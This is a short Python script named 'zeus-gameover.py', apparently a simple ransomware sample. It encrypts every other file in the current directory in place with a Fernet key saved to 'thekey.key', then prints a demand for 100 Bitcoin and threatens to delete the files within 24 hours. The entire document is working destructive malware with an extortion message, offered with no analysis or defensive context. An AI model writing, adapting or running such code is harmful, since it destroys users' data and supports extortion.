import os
from cryptography.fernet import Fernet

files = []

#print all the files in your system
for file in os.listdir():
    if file == "zeus-gameover.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

#generates the encryption key
key = Fernet.generate_key()

#add the key into a key file
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

#encrpt the files
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)


print("All of your files have been encypted!! send me 100 Bitcoin or I'll delete them in 24 hours...")